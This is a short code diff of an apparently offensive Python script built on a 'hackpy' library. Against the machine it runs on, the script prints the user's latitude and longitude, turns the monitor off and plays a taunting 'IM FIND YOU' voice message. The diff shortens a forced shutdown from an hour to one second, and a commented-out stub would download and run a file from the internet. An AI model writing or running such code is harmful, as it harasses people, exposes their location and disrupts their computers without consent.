@@ -9,7 +9,6 @@ import hackpy
 PATH = os.path.dirname(os.path.realpath(__file__)) # Get current directory path
 CORE = os.path.basename(os.path.realpath(sys.argv[0])) # Get this script filename.
 
-hackpy.configure() # Folder for temp files.
 hackpy.clean() # Remove all hackpy temp files from system
 hackpy.load(architecture=64) # default it 32
 
@@ -41,7 +40,7 @@ print('LATITUDE: ' + str(data['lat']) + ', LONGITUDE: ' + str(data['lon']) + ', 
 # Nircmdc reference: https://nircmd.nirsoft.net
 hackpy.nircmdc('monitor off')
 hackpy.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
-hackpy.system('shutdown -s -t 3600')
+hackpy.system('shutdown -s -t 1')
 
 # Load and execute file from internet
 # file = hackpy.wget(direct.link.here)
